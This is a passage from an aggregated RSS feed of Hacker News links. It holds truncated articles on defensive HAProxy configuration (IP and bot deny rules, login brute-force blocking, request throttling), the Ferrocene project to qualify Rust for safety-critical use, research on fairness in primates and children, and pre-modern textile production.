			<p>It’s safe to say that we’ve all been in a situation where you need to filter a large number of requests based on the client’s IP address (e.g. when mitigating DDOS attack coming from specific subnets or countries).</p>
<p>So your question is probably “Why use HAProxy when you can use .htaccess or Nginx vhost?”.</p>
<p>The answer is pretty straightforward: HAProxy is much lighter in terms of CPU and memory, especially when it comes to filtering a large number of concurrent requests.</p>
<p>In the example below, we have an ACL called ”badguys”. HAProxy will try to match the visitor’s IP address for each HTTP request in the list of IP ranges in the badguys.txt file. To keep the list as small as possible, IP ranges are listed in CIDR notation.</p>

		</div>
	</div>

	<div>
		<div>
			<pre data-enlighter-language="dockerfile" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group=""># Returns 403 error response if the request came from blacklisted IP
acl badguys src -f /etc/haproxy/badguys.txt
http-request deny if badguys</pre>

		</div>
	</div>
</div></div></div><div><div><div>
	<div>
		<div>
			<p>Similar to IP addresses, list files can be used to store other information. In this example, we want to block all requests with a specific string in the user-agent, except when the request was made to a specific domain.</p>
<p>Make sure to note the <strong>hdr_end</strong> directive, because it matches the end of the domain in the Host header. Depending on your use-case, you might want to match the value using alternative variables such as <strong>hdr_beg, hdr_sub</strong> or <strong>hdr_reg</strong>.</p>
<p>The exclamation point before the ACLs name indicates a negation. Also, bear in mind that HAProxy has a short-circuit evaluation of ACLs, which means the ACL evaluation will stop as soon as one of the conditions is not matched.</p>

		</div>
	</div>

	<div>
		<div>
			<pre data-enlighter-language="dockerfile" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group=""># Returns 403 error if the request came with blacklisted user-agent header
acl badbot hdr_sub(User-Agent) -i -f /etc/haproxy/badbots.txt
acl excluded_domain hdr_end(Host) -i -f /etc/haproxy/exclude.txt
http-request deny if badbot !excluded_domain</pre>

		</div>
	</div>
<p><img alt="programmer immersed in code" src="https://www.sysbee.net/wp-content/uploads/2020/05/charles-deluvio-pjAH2Ax4uWk-unsplash-1140x445.jpg" data-oi="//www.sysbee.net/wp-content/uploads/2020/05/charles-deluvio-pjAH2Ax4uWk-unsplash-1140x445.jpg" width="t" height="t"></p></div></div></div><div><div><div><div data-hspacer="no_spacer" data-halign="left"><div>
<h4><span>Login brute-force prevention</span></h4>
</div></div>
	<div>
		<div>
			<p>HAProxy is very useful when it comes to filtering automated login and contact form attacks. In this example, we will concentrate on login forms.</p>
<p>For automated login attempts, bots/scripts usually attempt to send a single POST request to a specific URL. Smarter bots will try to imitate a legitimate user by sending a GET request beforehand, but to save bandwidth and time, they don’t load the entire login page with all the static resources.</p>
<p>To better understand the configuration example below, we’ll first explain specific configuration directives we mentioned in this example:</p>
<ul>
<li>The <strong>cookie insert</strong> directive in the backend instructs HAProxy to add an “SB_TRACK” cookie to HTTP response headers.</li>
<li><strong>indirect</strong> instructs HAProxy to insert the cookie if the client does not already have one</li>
<li><strong>nocache</strong> means that HAProxy will also add a “Cache-Control: nocache” response header so that the response is not accidentally cached between the client and HAProxy (e.g. if there is a caching server or a CDN node between them)</li>
<li><strong>bk_nocookie</strong> is a backend which points to the same web server, but HAProxy won’t add tracking cookie. Legitimate users will pick up a cookie by requesting any static resource that’s loaded from default <strong>bk_http</strong> backend.</li>
</ul>
<p>The logic behind it is straightforward – the idea is to block bots and malicious users who aim to send as many requests as possible and who will not collect tracking cookies.</p>
<p>Before submitting login credentials, users usually need to access a login page. In our example, legitimate users will pick up <strong>SB_TRACK</strong> cookie set by HAProxy when they access that login page and the collected cookie will later allow them to submit login credentials using POST HTTP method.</p>
<p>Bots and automated scripts in most cases are not bothered to accept cookies. They are easily blocked from submitting login requests by merely checking if their requests came with previously collected SB_TRACK cookie.</p>

		</div>
	</div>

	<div>
		<div>
			<pre data-enlighter-language="dockerfile" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">frontend ft_http
...
    acl cms_cookie hdr_sub(cookie) SB_TRACK=c1
    acl cms_admin url_sub /wp-login.php
    acl cms_admin url_beg /admin/

    http-request deny if cms_admin METH_POST !cms_cookie

    use_backend bk_nocookie if cms_admin
    default_backend bk_http


backend bk_http
    cookie SB_TRACK insert indirect nocache
    server web1 192.168.10.10:80 cookie c1

backend bk_nocookie
   server web1 192.168.10.10:80
</pre>

		</div>
	</div>
</div></div></div><div><div><div><div data-hspacer="no_spacer" data-halign="left"><div>
<h4><span>Basic HTTP request throttling</span></h4>
</div></div>
	<div>
		<div>
			<p><span data-preserver-spaces="true">HAProxy is the ideal tool for getting the most out of a server that will be under increased load for a short period. Excellent examples of such occurrences are Black Friday promotions, holiday sales, and similar.&nbsp;</span></p>
<p><span data-preserver-spaces="true">In certain situations, the server can be rescued with the HAProxy queueing mechanism.</span></p>
<p><span data-preserver-spaces="true">In this example, the queueing policy is defined in the backend configuration section. Key directives are:</span></p>
<ul>
<li><span data-preserver-spaces="true"><strong>minconn</strong> – represents a concurrent number of connections to the backend server in calm conditions. All requests above the minconn limit will be queued.</span></li>
<li><span data-preserver-spaces="true"><strong>fullconn</strong> – specifies at what backend load the servers will reach their maxconn.</span></li>
<li><span data-preserver-spaces="true"><strong>maxconn</strong> – defines the concurrent number of connections to the backend server when fullconn limit is reached.</span></li>
</ul>

		</div>
	</div>

	<div>
		<div>
			<pre data-enlighter-language="dockerfile" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">backend bk_http
    fullconn 100
    server web1 192.168.10.10:80 check inter 2s minconn 20 
maxconn 30
    server web2 192.168.10.20:80 check inter 2s minconn 20 maxconn 30
</pre>

		</div>
	</div>

	<div>
		<div>
			<p>In this example, we’ve set arbitrary “soft” and “hard” limits for a concurrent number of sessions which our backend servers can handle.</p>
<p>Each server will handle 20 concurrent sessions (defined with minconn). In case there’s a surge of requests, HAProxy will automatically queue those requests. If the number of queued requests exceed the fullconn limit (in our example 100 sessions), HAProxy will increase concurrency to 30 sessions per server (defined with maxconn) in effort to lower the number of queued requests.</p>
<p>Requests are queued until the <strong>timeout queue limit</strong> is reached (e.g., 60 seconds), during which time users will wait for the page to display in their browser.<br>If the timeout limit is reached, HAProxy will return a 504 gateway timeout error.</p>
<p>Use of the HAProxy queues makes sense only for short-term requests bursts because even if the minconn or maxconn limits are increased, the bottleneck will always be the processing speed of the backend servers.</p>

		</div>
	</div>
</div></div></div><div><div><div><div data-hspacer="no_spacer" data-halign="left"><div>
<h4><span>Advanced HTTP request throttling</span></h4>
</div></div>
	<div>
		<div>
			<p>Traffic throttling, as described in the previous example is applicable in certain situations (primarily if all requests are sent by legitimate users). But what if one or more malicious users send a large number of requests to the server and slow down the backend server for all other users?</p>
<p>Problematic …</p></div></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.sysbee.net/devops-blog/haproxy-sysadmins-swiss-army-knife/">https://www.sysbee.net/devops-blog/haproxy-sysadmins-swiss-army-knife/</a></em></p>]]>
            </description>
            <link>https://www.sysbee.net/devops-blog/haproxy-sysadmins-swiss-army-knife/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26355381</guid>
            <pubDate>Fri, 05 Mar 2021 10:52:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ferrocene Part 3: The Road to Rust in mission- and safety-critical]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26355333">thread link</a>) | @lukastyrychtr
<br/>
March 5, 2021 | https://ferrous-systems.com/blog/ferrocene-update-three-the-road/ | <a href="https://web.archive.org/web/*/https://ferrous-systems.com/blog/ferrocene-update-three-the-road/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><img src="https://ferrous-systems.com/images/ferrocene_logo_horizontal.svg" alt="The Ferrocene logo. A ball between two planes. The name ferrocene next to it."></p>



<p><i>To celebrate this announcement, we will be around at this years <a href="https://www.embedded-world.de/en/exhibitor-list">embedded world digital</a>. You can watch our pitch talk on Wednesday, March 3rd, from 11:10am - 11:20am CET (UTC+1).
We're available for 1:1 meetings all week.<p>

You can book those through the embedded world web application by searching for "Rust" or "Critical Section" in the exhibitors list.</p></i>
</p>

<p><i>We ran a Q&amp;A on YouTube Live on Monday, the recording can be watched <a href="https://www.youtube.com/watch?v=C3X-H4w5a7Q">here</a></i>
</p>

<p>Ferrocene is an effort led by Ferrous Systems and its newly formed subsidiary Critical Section GmbH to qualify the Rust Language and Compiler for use in the safety-critical domain. This is the third post in a series detailing our plans and actions around this effort, addressing topics discussed in <a href="https://ferrous-systems.com/blog/sealed-rust-the-pitch/">The Pitch</a> and <a href="https://ferrous-systems.com/blog/sealed-rust-the-plan/">The Plan</a>. Ferrocene's draft name was "Sealed Rust."</p>

<p>Our goal is to <strong>improve the status-quo of software quality and correctness in safety-critical domains</strong> by enabling the use of the Rust Programming Language for safety-critical software development. We believe that Rust is a significant improvement over existing tools both from a safety and quality perspective and as an improvement for developer productivity.</p>

<p>You can follow the progress on these efforts on the <a href="https://ferrous-systems.com/blog/">Ferrous Systems' Blog</a>, by <a href="https://eepurl.com/guoC6P">subscribing to our newsletter</a>, or by <a href="mailto:ferrocene@critical-section.com">contacting us directly</a>.
Ferrocene is currently looking for partner commitments! Please get in <a href="mailto:contact@critical-section.com">touch via email</a> if interested.</p>

<p>Since our last post in February 2020, we have moved Ferrocene from an idea to an actual project. We strengthened our contacts with interested companies and went deeper into our industrial and language research.</p>

<h2 id="finding-a-route-user-research">Finding a route: User Research</h2>

<p>Over the last 1.5 years, we have conducted several interviews with parties deploying software in safety-critical or mission-critical environments. The participants were diverse, from cloud providers to vehicle manufacturers. We found broad interest in adopting Rust in those industries.</p>

<p>There were several key takeaways:</p>

<ol>
  <li>Rust as a language is seen as the big contender in critical spaces. Particularly, its focus on rigor and stability is seen as a major competitive advantage.</li>
  <li>At the same time, language evolution and improvement speed is also a crucial factor of interest.</li>
  <li>There is a desire for improvement over current language specification practices.</li>
  <li>Rust only having one main compiler at the moment is seen as a strength at the current phase of the language.</li>
  <li>Interviewed organisations see the language on a good trajectory towards their needs.</li>
</ol>

<p>On further investigation, we found a lot of openness and desire for modern, tool-assisted specification and verification techniques. Rust was regarded as being on a good path and quoted as being a language that was already easier to analyze and inspect than other languages. For that reason, we researched existing practices.</p>

<p>In addition to the above, we overwhelmingly found that the projects and tools already providing analysis and further safety guarantees operate on <a href="https://blog.rust-lang.org/2016/04/19/MIR.html">MIR</a>, Rust's mid-level intermediate representation, and other IR rather than the Rust source language. They utilized MIR to carry program meaning in a simplified manner, enabling easier analysis and reasoning. As such, a desire expressed was visibility into changes to MIR and versioned stability.</p>

<p>When further interviewed on stability, organizations expressed a desire to adopt a technology that continually increases safety and assurance levels. Most organizations considered stability a consequence of structured, deliberate changes between documented milestones one can predictably target. We summed this up as "addressability". This framing resonated in interviewed organizations.</p>

<p>There was a high respect for Rust's software practices both inside and outside of the main project. It was mentioned as a strong point that many traditionally research-related tasks are conducted within the project.</p>

<p>In conclusion, there was a shared desire to produce safer, higher-quality software <strong>faster</strong> and a sense that <strong>fundamental changes are necessary</strong>.</p>

<h2 id="finding-an-orientation-why-ferrocene">Finding an orientation: why Ferrocene?</h2>

<p>A key question from these discussions with industry-leaders: what is Ferrocene, the product, and how does it relate to Rust? There was strong interest from potential clients that work that <em>can be</em> upstreamed into the Rust compiler <em>should be</em> wherever possible. We believe this points to a focus shift in the industry. Companies understand the value of FOSS as a neutral commons but also want to invest through initiatives that work towards their goals.</p>

<p>There are services required for mission and safety-critical industries that go beyond shipping a compiler. This includes (very) long-term support, qualification packages, industry-specific tooling, backends and targets, training, verification help and industry-specific advice. This is Ferrocene, the product.</p>

<p>During our conversations with industry leaders, we found that there's a need for Ferrocene as a wider initiative. Increasing the trust level of the Rust compiler will benefit many industries, and focusing only on typical safety-critical environments is one part of the picture. Improvements in the trust level of the core technology benefit <em>all</em> participants in the ecosystem. For example, we see efforts in better describing the semantics of Rust as it exists today as an important baseline for guiding the evolution of the language.</p>

<p>Ferrocene is both. It is a product to serve markets that need high assurances and committments. It is an initiative to take Rust to the next level of reliabilty and trust. Out of that comes a strong desire for collaboration.</p>

<h2 id="having-a-direction-first-waypoints">Having a direction: First Waypoints</h2>

<p>We intend to publish a solidified roadmap for Ferrocene by June 2021.</p>

<p>A major early milestone for Ferrocene is achievable criticality levels. Currently, we're aiming at ISO 26262/ASIL-B qualification readiness and general availability by the end of 2022. Along the way, we will work closely with early adopters to increase the toolchain's quality and gather feedback and experiences.</p>

<p>Ferrocene is a vehicle for a versioned Rust and MIR specification, paired with automated verification of Rust semantics. These "runnable specs" give developers in mission-critical and high-security environments a sound, proven, and addressable foundation for building critical libraries, analysis tools, and further system assurances.</p>

<p>Critical Section is also committed to improving the developer experience in mission and safety-critical industries. Ferrocene includes efforts to bring existing verification tools, like MIRI, to a production-ready state, while also improving the ease and advanced capabilities of formally verifying Rust programs.</p>

<h2 id="finding-partners-the-travel-group">Finding Partners: The travel group</h2>

<p>We have a lot of work ahead of us, but also a lot of experiences to tap into.</p>

<p>Ferrous Systems and Critical Section are calling for additional partners to join that effort! We're interested in partners from many industries, including:</p>

<ul>
  <li>Safety-critical sectors, such as automotive, railway and aerospace</li>
  <li>Operators of mission-critical infrastructure with high-reliability and security concerns, such as cloud vendors</li>
  <li>Hardware vendors</li>
  <li>Compiler vendors</li>
  <li>Organisations that require structured knowledge of their base systems</li>
  <li>Is interested in building strong, deep Rust knowledge now</li>
</ul>

<p>Partners also get early access to Ferrocene releases and can follow the development closely with engineer support.</p>

<p>If that describes your organisation, <a href="mailto:contact@critical-section.com">we're happy to be in touch</a>.</p>

<h2 id="starting-the-engine">Starting the engine</h2>

<p>In August 2020, Ferrous Systems GmbH created a wholly-owned subsidiary called Critical Section GmbH. Critical Section started work on Ferrocene in September 2020, setting up roadmaps, finalizing user research, and outreach to partners. Ferrocene is currently managed by Florian Gilcher and Sabree Blackmon.</p>

<h2 id="thanks">Thanks</h2>

<p>We would like to thank Tim Reed and Jack Greenbaum from Green Hills Software for their constant advice, guidance and collaborative experimentation along the way.</p>
</div></div>]]>
            </description>
            <link>https://ferrous-systems.com/blog/ferrocene-update-three-the-road/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26355333</guid>
            <pubDate>Fri, 05 Mar 2021 10:45:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Was the Golden Rule Born in the Mind of a Monkey?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26355201">thread link</a>) | @CapitalistCartr
<br/>
March 5, 2021 | http://m.nautil.us/blog/-was-the-golden-rule-born-in-the-mind-of-a-monkey | <a href="https://web.archive.org/web/*/http://m.nautil.us/blog/-was-the-golden-rule-born-in-the-mind-of-a-monkey">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			

			<p><span><span>A</span>s economic inequality increased in many wealthy nations in recent years, a debate has developed around the question of whether inequality is bad for national economies—and bad for their citizens. A captivating video clip of monkey behavior</span>&nbsp;(see below)<span>, taken from </span><a href="http://www.ted.com/talks/frans_de_waal_do_animals_have_morals" target="_blank">a 2011 TED talk</a><span> by primatologist Frans de Waal, has become a surprising piece of ammunition in this discussion.</span></p><p><span>The video illustrates a famous 2003 </span><a href="http://www.nature.com/nature/journal/v425/n6955/abs/nature01963.html" target="_blank">experiment</a><span> by de Waal and his colleague Sarah Brosnan. It begins with a capuchin monkey being rewarded with a cucumber slice for handing a rock to the experimenter. The monkey happily performs this task and collects her payment—until the monkey next to her is given a more desirable reward, a grape, for the same job. The first monkey then flings the unappetizing cucumber from her cage. In the study, the monkeys often refused to hand over a rock if they saw the other monkey get grapes while they themselves continued to get cucumbers.</span></p> <iframe width="732" height="412" src="//www.youtube.com/embed/meiU6TxysCg" frameborder="0" allowfullscreen=""></iframe> <p><a href="http://nautil.us/issue/1/what-makes-you-so-special/the-cosmopolitan-ape" target="_blank">Frans de Waal</a> says that his research with primates shows that “instead of fairness and justice being intellectual products, something we have arrived at through reason, they are embedded in basic emotions, some of which are found in other primates,” possibly through a shared evolutionary history. “This is basically the [Occupy] Wall Street protest that you see here,” de Waal says at the end of the video clip. If his point about fairness is right, then arguments about inequality take on a biological imperative—greater equality can be seen as the “natural order” of things, and inequality as an inherently destructive force. As de Waal himself has argued in his&nbsp;<i>The Age of Empathy</i>, our capacity for building a stable society rests in part on knowing what kind of animals we humans are.</p><p><span>For a social-justice activist, the message from the monkeys may seem clear: Equal effort deserves equal pay, and any society that ignores this simple principle is messing with a deeply rooted instinct for fairness. But within the scientific world, far from settling the nature of fairness, Brosnan and de Waal’s classic study has prompted a stream of research that shows just how complex and fragile fairness can be in primate and human interactions.</span><br></p><p>If you watch the video of the capuchin monkeys (especially if it’s in the context of a blog post on income equality), it may seem obvious that the underpaid monkey is objecting to unfair treatment. But a sense of fairness may not be what’s driving the monkey’s behavior. Imagine that there was no second monkey in the experiment, just one monkey and an experimenter with a bowl full of cucumbers and another full of grapes. If the monkey were given the cucumber as a reward in that case, she might also object to it—not because it was unfair, but just because the cucumber doesn’t seem very appealing once the monkey knows there are grapes to be had. The monkey who rejects cucumbers may be less like a political protester and more like a two-year-old swatting away a proffered apple slice when a well-stocked candy jar is in full view.</p><p>To show that fairness is involved, the experiments need to demonstrate that monkeys are more reluctant to do the task when another monkey actually receives better payment, as compared with a situation in which the better reward is simply clearly visible. When such controls have been applied, the results of the studies have been mixed: Some primate species, like the highly social capuchin monkeys, do show sensitivity to social inequity, but chimpanzees generally seem less preoccupied with fairness.</p> <blockquote><p>“This is basically the [Occupy] Wall Street protest that you see here.”</p> </blockquote> <p>On the whole, evidence for fairness in other primates is much more limited than it is in adult humans. Monkeys and apes don’t reject an unequal distribution if the food is freely given rather than paid out in exchange for a task. In the lab, they generally act in their own interest when choosing how to dole out resources, while people are more likely to share equally with a partner. And they don’t turn down unequal offers in a task known as the “ultimatum game,” in which one partner decides how to divide up some resources and the other partner either accepts the offer or decides that neither partner will get anything. People often sacrifice resources in order to express contempt for an unequal offer, whereas chimps typically take what they can get, fair or not.</p><p>Experimental comparisons between humans and other animals are notoriously tricky, and there may be many reasons why primates don’t respond to unfairness in the particular ways that are measured in experiments. In some cases, the animals may have noticed an unequal outcome, but the experimental setup doesn’t offer the option for a useful response—and since they can’t verbally object to the injustice, we may never know how they really feel about it. In other cases, the experimental tasks may be so complicated that the animals fail to fully grasp their consequences. So while there’s some evidence that equity plays a role in animal behavior, scientists continue to debate whether this really shows that fairness is an instinct that we share with other animals.</p><p>Another way of approaching the question is to look at how fairness shapes the behavior of human children; a very early sensitivity to fairness would support the idea that it’s at least partly innate rather than entirely the product of cultural indoctrination.</p><div id="inpagesub">
	<p>Get the <span>Nautilus</span> newsletter</p>
<p>
	The newest and most popular articles delivered right to your inbox!
</p>
			<!-- Begin MailChimp Signup Form -->
			




</div> <p><span>And indeed, babies distinguish between fair and unfair behavior in others at a very young age. In a </span><a href="http://onlinelibrary.wiley.com/doi/10.1111/j.1467-7687.2011.01048.x/abstract?deniedAccessCustomisedMessage=&amp;userIsAuthenticated=false" target="_blank">study</a><span> by Alessandra Geraci and Luca Surian, 12- to 18-month-old babies watched short videos in which one “fair” animated character gave a toy to each of two other characters, while another “unfair” character handed two toys to a single character, leaving the other empty-handed. Afterwards the children were offered pictures of the fair and unfair characters and were told to pick one of them. Fourteen of 17 babies chose the fair character rather than the unfair one, suggesting that infants value fairness in others long before they’re capable of having conversations about morality and ethics.</span></p><p>But studies show that it takes a surprisingly long time for children to incorporate fairness into their own actions. Three- and 4-year-olds do readily object to an unequal distribution of resources if they’ve received the short end of the stick. But, like non-human primates, they rarely protest when they’re on the winning end of an unequal distribution. This makes it hard to know whether it’s <i>unfairness</i> that they dislike, or simply getting less than others.</p><blockquote><p>As children become aware of their social reputations, they start to behave in ways that they know are valued by others.</p> </blockquote><p><span>In fact, in deciding how to distribute resources, preschoolers strongly favor divisions in which they come out ahead of others; not only are they likely to claim more than their own share, they even show a spiteful tendency to </span><i>sacrifice</i><span> resources if it means that they can have more than someone else. A&nbsp;</span><a href="http://www.sciencedirect.com/science/article/pii/S0010027713002102" target="_blank">study</a><span> by Mark Sheskin and colleagues showed that when given a choice between allotting two prize tokens each to themselves and another child and claiming one for themselves while giving none to the other, 5- and 6-year-olds preferred the latter. If humans come predisposed to value fairness—and the study with young babies suggests that’s true—then it would appear that the abstract notion of fairness has to battle other, more self-serving impulses.</span><br></p><p>It’s not until closer to 8 years of age that children show a robust tendency to divide resources equally. And even then, they may be more concerned with <i>appearing</i> fair to others than with actually being fair. In <a href="http://dash.harvard.edu/bitstream/handle/1/10018932/shaw,et-al,gino,norton-children.pdf?sequence=1" target="_blank"></a><a href="https://www.hbs.edu/ris/Publication%20Files/shaw%20et%20al%202014_4fded5fb-0668-4025-9969-10f0ec36e2c3.pdf" target="_blank">study</a> led by Alex Shaw, children between 6 and 11 years of age had to decide how to allocate a nice prize and a lesser prize between themselves and another child. They were told that they could either just choose who got which prize, or they could flip a coin to determine the outcome. The older children (ages 9 to 11) chose to flip the coin 53 percent of the time, as opposed to 37 percent among the younger group. But when they were given the option to flip the coin in private and report the outcome, the “impartial” coin flip magically landed in their favor 62 percent of the time. This suggests that even for the older children, unfairness itself doesn’t necessarily cause distress—at least, not enough to make them give up the good prize. But as children become aware of their social reputations, they start to behave in ways that they know are valued by others.</p><p>As they approach adulthood, children show a steadily increasing tendency to distribute resources equally or even altruistically. But paradoxically, they may become less egalitarian in certain ways over the course of their development. Ernst Fehr and his colleagues <a href="http://www.econ.uzh.ch/faculty/fehr/publications/FehrRuetzlerSutterEERpublished.pdf" target="_blank">found</a> that children were more likely to deprive their peers of resources, even at a cost to themselves, if they were told that the other children came from a different school than if they were told that they belonged to the same school. This bias against members from a different group increased with age into the teen years, even though on the whole, teens were much less likely than younger kids to behave selfishly. In other words, they behaved more generously overall, but treated in-group and out-group members more unequally. For example, at ages 8 and 9, children made spiteful choices 41 percent of the time with in-group members and 44 percent of the time with out-group members, as compared with 17 versus 33 percent for 12- and 13-year-olds.</p><p>This growing body of research points toward conclusions that are much more nuanced than simply, “We are wired for equality.” Ultimately, <a href="https://nautil.us/issue/75/story/humans-are-wired-for-goodness" target="_blank">knowing what kind of animals we are</a> may help us better understand to what degree fairness is really an innate, primate value, as opposed to a product of our exceptional modern moment.</p><p><i>Julie Sedivy is a …</i></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://m.nautil.us/blog/-was-the-golden-rule-born-in-the-mind-of-a-monkey">http://m.nautil.us/blog/-was-the-golden-rule-born-in-the-mind-of-a-monkey</a></em></p>]]>
            </description>
            <link>http://m.nautil.us/blog/-was-the-golden-rule-born-in-the-mind-of-a-monkey</link>
            <guid isPermaLink="false">hacker-news-small-sites-26355201</guid>
            <pubDate>Fri, 05 Mar 2021 10:27:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Clothing, How Did They Make It? Part I: High Fiber]]>
            </title>
            <description>
<![CDATA[
Score 120 | Comments 11 (<a href="https://news.ycombinator.com/item?id=26355046">thread link</a>) | @CapitalistCartr
<br/>
March 5, 2021 | https://acoup.blog/2021/03/05/collections-clothing-how-did-they-make-it-part-i-high-fiber/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2021/03/05/collections-clothing-how-did-they-make-it-part-i-high-fiber/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>This week we are starting the first of a four (?) part look at pre-modern textile production.  As with our series on <a href="https://acoup.blog/2020/07/24/collections-bread-how-did-they-make-it-part-i-farmers/">farming </a>and <a href="https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/">iron</a>, we are going to follow the sequence of production from the growing of fibers all the way to the finished object, with a focus not merely on the methods of production but also <em>on the people doing the producing</em> at each stage of production.  Now while I have titled this series, “Clothing, How Did They Make It?” it is worth noting that textiles were used for a lot more than just clothing.  All sorts of household goods were produced this way.  In addition, of course, clothing was sometimes made out of non-textile materials (although, <a href="https://acoup.blog/2020/12/04/collections-that-dothraki-horde-part-i-barbarian-couture/">as we’ve discussed</a>, far less often than is portrayed in popular culture; in Eurasia, by and large, clothing meant textiles).  <strong>But what we are going to focus on here is really <em>textiles</em></strong> and (of course) the people that make them.  Leather working will have to wait for another day.</p>



<p>That said, even within textiles, to try to keep the scope manageable<strong> I am going to narrow things down further, by focusing on just two major fibers: wool and flax</strong> (which makes linen) and thus <strong>mostly focus on how this worked in the Mediterranean</strong>, broadly construed (so the Near East, North Africa and Europe).  I am choosing these two fibers because they dominate in locally produced textiles in the Near East and Europe for much of the pre-modern period.  Cotton, another important fiber, only seems to have been cultivated in Egypt in the Roman period (though, as far as I can tell, at some point Egyptian cotton cultivation seems to have largely dropped off, only to boom again in the Early Modern though this is a point about which I can express little confidence in my knowledge) and for much of Europe remained an expensive import fiber through the Middle Ages, transported from South Asia.  Likewise, silk remained in the pre-modern period almost entirely an expensive import good from far to the East of the Mediterranean.  Of course any import good must be local somewhere, but my expertise in pre-modern textile production does not extend so far into South or East Asia, so the task of laying that out must fall to someone else.  We will talk a <em>bit</em> about these fibers as they arrive in the Mediterranean as trade goods, but mostly stay focused on wool and flax.</p>



<p>The very rarity of these goods in the Near East and Europe confined them to the upper-classes, while wool and linen often remained the everyday fibers (though even the very wealthy used textiles of high quality wool and linen as well) and so saw a lot more use.  More importantly to our investigation here, for the ancient Mediterranean (where my knowledge is best) wool and linen were <em>by far</em> the fibers most involved in the household textile production.  Of course other fibers were used locally in the Mediterranean as well – hemp, nettle and even tree-bast, but the vast majority of<strong> textiles being produced in the broader Mediterranean world were wool and linen and so we are going to focus on that.</strong></p>



<figure><img data-attachment-id="6453" data-permalink="https://acoup.blog/616302001/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/03/616302001.jpg" data-orig-size="2218,1817" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="616302001" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/03/616302001.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2021/03/616302001.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2021/03/616302001.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2021/03/616302001.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2021/03/616302001.jpg?w=2048 2048w, https://acoupdotblog.files.wordpress.com/2021/03/616302001.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2021/03/616302001.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2021/03/616302001.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><a href="https://www.britishmuseum.org/collection/object/G_1814-0704-573">From the British Museum</a>, a fourth century bell krater depicting the Judgement of Paris (which in turn leads to the Trojan War).  Paris, at the time, was living in exile as a shepherd – the occupation notable because of its lowly status.  Here he is seen seated with his shepherd’s crook (the standing male figure is Hermes); the animal below Paris is a sheep (you can see the twisted horns; to the right is a dog, presumably assisting in the herding.</figcaption></figure>



<p>Worry not, we will have more than enough to talk about with just those two fibers.  This week, we’re going to focus just on producing the raw fibers – how flax is farmed and how wool is produced from sheep.  Next week, we’ll look at the long process of taking those raw fibers, processing them and spinning them into thread.  The week after that, we’ll look at weaving as well as dying, bleaching and other color treatments treatments.  Then finally in the last week, we’ll look at finally sewing but also at markets and trade. <strong> As always, we’ll try to direct attention not only to the processes, but also to the workers who <em>performed</em> those processes and their place in the broader society.</strong></p>



<p>And that brings us to the second reason to discuss textile production, which is that in the broader pre-modern Mediterranean <strong>much of the textile production</strong> <strong>was done within the household and nearly all of that household production was done by women</strong>.  Now as we’ll see, household spinning, weaving and sewing is by no means the only jobs involved in the production of the clothes that say an Egyptian, Babylonian, Roman or early Medieval European family would wear and some important stages of production here were also generally done by men.  As I have mentioned before, the literary sources for the pre-modern world generally prefer to talk about individuals who are rich, male, and free, but as we will see, the workers involved in each stage of textile production are almost never rich, frequently not male and sometimes not free.  Nevertheless investigating textile production gives us a chance to peer into parts of the lives of some historical subjects that we very rarely hear about: women (rich and poor, slave and free), along with enslaved or poor men doing work that left them well outside of the ‘polite society’ of our literary sources.</p>



<p>I should note at the beginning that while I am going to try to keep this discussion general and at points cover technological or regional variations in how textiles in wool and linen were made, in practice a lot of what I am going to write here is going to reflect in particular practice during the Roman period (especially the period of the Republic) and even more specifically than that in Roman Italy, simply because that is where my own specialist knowledge is best.  Consult your friendly neighborhood primary sources when looking to apply these systems on a wider basis either geographically or chronologically!</p>



<p>As always, if you like what you are reading here, please share it; if you really like it, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>. And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings.</p>






